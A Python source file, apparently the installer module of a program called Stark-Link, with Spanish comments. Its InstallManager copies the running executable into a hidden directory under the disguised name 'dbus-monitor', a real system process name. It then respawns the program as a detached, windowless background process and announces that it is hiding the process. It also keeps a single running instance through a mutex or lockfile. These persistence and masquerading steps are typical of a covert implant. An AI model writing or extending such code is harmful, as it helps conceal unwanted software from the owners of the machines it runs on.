# Labels
__RESOURCE_TYPE__ = "STRUCTURAL"

# Library import
from abc import ABC, abstractmethod
from .. import ManagerInterface, ModuleInterface
import os
from . import modules
import shutil
import traceback
import sys
import subprocess
from typing import Optional

# Classes definition
class InstallManager(ManagerInterface):
    # Private methods
    def _execute_preinstall(self) -> bool:
        for module_name, module_class in self.module_container.modules_table.items():
            if module_class.INSTALL_STAGE != module_class.INSTALL_STAGE_PREINSTALL:
                # Skip the module
                continue

            print(f"[InstallManager] Starting pre-install module: {module_name}")

            try:
                # Instance the module
                module_instance = module_class(self.module_container, self.system)
                
                # Start the module
                module_instance.start()
            except:
                print(f"[InstallManager] Error starting the module: {module_name}")
                continue
        
        # Return results
        return True
    
    def _execute_install(self) -> bool:
        for module_name, module_class in self.module_container.modules_table.items():
            if module_class.INSTALL_STAGE != module_class.INSTALL_STAGE_PROINSTALL:
                # Skip the module
                continue
            
            print(f"[InstallManager] Starting install module: {module_name}")

            try:
                # Instance the module
                module_instance = module_class(self.module_container, self.system)
                
                # Start the module
                module_instance.start()
            except:
                print(f"[InstallManager] Error starting the module: {module_name}")
                continue
        
        # Return results
        return True

    def _execute_postinstall(self) -> bool:
        for module_name, module_class in self.module_container.modules_table.items():
            if module_class.INSTALL_STAGE != module_class.INSTALL_STAGE_POSTINSTALL:
                # Skip the module
                continue
            
            print(f"[InstallManager] Starting post-install module: {module_name}")

            try:
                # Instance the module
                module_instance = module_class(self.module_container, self.system)
                
                # Start the module
                module_instance.start()
            except:
                print(f"[InstallManager] Error starting the module: {module_name}")
                continue
        
        # Return results
        return True

    def _deploy_resources(self) -> bool:
        process_source = self.system.virtual_file_system.query("PROCESS_SOURCE_FILEPATH")
        secure_directory = self.system.virtual_file_system.query("SECURE_DIRECTORY_PATH")

        # ADAPTACIÓN MULTIPLATAFORMA: Agregar .exe si estamos en Windows
        new_process_name = "dbus-monitor"
        if os.name == 'nt':
            new_process_name += ".exe"

        target_path = os.path.join(secure_directory, new_process_name)
        
        try:
            shutil.copy2(process_source, target_path)

            os.chmod(target_path, 0o700)
            print("[InstallManager] Program file deployed to:", target_path)

            # Re-name the new destination file
            self.system.virtual_file_system.update("PROCESS_SOURCE_FILEPATH", target_path)
            return True
        except:
            traceback.print_exc()
            return False

    def _deploy_install_flag(self) -> bool:
        try:
            install_flag_filepath = self.system.virtual_file_system.query("INSTALL_FLAG_FILEPATH")
            file = open(
                file=install_flag_filepath,
                mode='w',
                encoding="UTF-8"
            )
            file.close()
        except:
            traceback.print_exc()
            return False
        
        return True

    def _respawn_system(self) -> Optional[bool]:
        vfs = self.system.virtual_file_system
        new_executable = vfs.query("PROCESS_SOURCE_FILEPATH")
        
        # Preparación de flags y parámetros según OS
        creation_flags = 0
        kwargs = {
            "stdout": subprocess.DEVNULL,
            "stderr": subprocess.DEVNULL,
            "stdin": subprocess.DEVNULL,
            "close_fds": True
        }

        print(f"[InstallManager] Ejecutando handoff multiplataforma hacia: {new_executable}")

        if os.name == 'nt':
            # 0x01000000 = CREATE_BREAKAWAY_FROM_JOB
            # Permite que el proceso sobreviva aunque el padre (terminal) muera.
            CREATE_BREAKAWAY_FROM_JOB = 0x01000000
            creation_flags = subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS | CREATE_BREAKAWAY_FROM_JOB
            kwargs["creationflags"] = creation_flags
        else:
            # --- LÓGICA PARA GNU/LINUX ---
            # start_new_session=True: Crea un nuevo SID (Session ID). 
            # El proceso se vuelve líder de su propia sesión y se desvincula de la tty.
            kwargs["start_new_session"] = True

        try:
            # Ejecución del proceso hijo
            subprocess.Popen(
                [new_executable] + sys.argv[1:],
                **kwargs
            )
            
            print("[InstallManager] Proceso hijo liberado. El proceso original se cerrará ahora.")
            
            # Usamos os._exit(0) en lugar de sys.exit() para asegurar una terminación 
            # inmediata del proceso padre sin intentar limpiar manejadores de la terminal.
            os._exit(0)
            
        except Exception as e:
            print(f"[InstallManager] Error crítico durante el respawn: {e}")
            return False

    def _is_already_running(self) -> bool:
        """Verifica si ya existe una instancia de Stark-Link ejecutándose."""
        if os.name == 'nt':
            import ctypes
            # Creamos un nombre único para el Mutex del proyecto
            mutex_name = "Global\\StarkLink_Execution_Mutex_v2"
            self.mutex = ctypes.windll.kernel32.CreateMutexW(None, False, mutex_name)
            last_error = ctypes.windll.kernel32.GetLastError()
            
            # 183 es el código de ERROR_ALREADY_EXISTS
            if last_error == 183:
                return True
            return False
        else:
            # Lógica para Linux usando un archivo de bloqueo (lockfile)
            import fcntl
            lock_file_path = "/tmp/stark_link.lock"
            self.lock_file = open(lock_file_path, 'w')
            try:
                fcntl.lockf(self.lock_file, fcntl.LOCK_EX | fcntl.LOCK_NB)
                return False
            except IOError:
                return True

    # Public methods
    def start(self) -> bool:
        # 1. EVITAR DUPLICADOS: Si ya hay uno corriendo, suicidio inmediato.
        if self._is_already_running():
            print("[Link] Ya existe una instancia activa. Abortando.")
            os._exit(0)

        self.module_container.load_modules(package=modules.__package__)
        
        is_installed = self.system.virtual_file_system.is_installed()
        current_path = os.path.abspath(sys.executable)
        secure_path = self.system.virtual_file_system.query("PROCESS_SOURCE_FILEPATH")
        
        # 2. SI YA ESTÁ INSTALADO
        if is_installed:
            # Caso A: Ejecución desde ubicación externa -> Migrar y morir
            if current_path != secure_path:
                print("[Link] Migrando a ubicación segura...")
                self._respawn_system()
                return True # Este proceso muere aquí
            
            # Caso B: Está en la ruta correcta pero tiene terminal (ej. doble clic manual)
            if "--background" not in sys.argv:
                print("[Link] Ocultando proceso...")
                self._respawn_system() 
                return True # Este proceso muere aquí
            
            # Caso C: Es la instancia definitiva (en AppData y con flag --background)
            print("[Link] Instancia operativa en segundo plano.")
            return False # Retornamos False para que el sistema principal continúe

        # 3. PRIMERA INSTALACIÓN
        else:
            print("[Link] Iniciando despliegue inicial...")
            self.install()
            return True # Tras install() se llama a respawn, así que este proceso muere

    def stop(self) -> bool:
        pass

    def install(self) -> bool:
        # Execute the pre-install modules
        self._execute_preinstall()

        # Verify the existence of the secure directory
        if os.path.exists(self.system.virtual_file_system.query("SECURE_DIRECTORY_PATH")):
            print("The secure directory path already exists")
        else:
            os.mkdir(self.system.virtual_file_system.query("SECURE_DIRECTORY_PATH"))
            print("[InstallManager] Secure directory path created successfully")
            
        # Deploy software resources
        if not self._deploy_resources():
            return False

        # Execute the install modules
        self._execute_install()

        # Deploy the installed flag
        if not self._deploy_install_flag():
            return False
        
        # Execute the post-install modules
        self._execute_postinstall()

        # Restart the system (on the installed state)
        self._respawn_system()

        # Return results
        return True
    
class InstallationModule(ModuleInterface, ABC):
    # Class properties definition
    INSTALL_STAGE_UNDEFINED: str = "UNDEFINED"
    INSTALL_STAGE_PREINSTALL: str = "PRE-INSTALL"
    INSTALL_STAGE_PROINSTALL: str = "PRO-INSTALL"
    INSTALL_STAGE_POSTINSTALL: str = "POST-INSTALL"

    INSTALL_STAGE: str = INSTALL_STAGE_UNDEFINED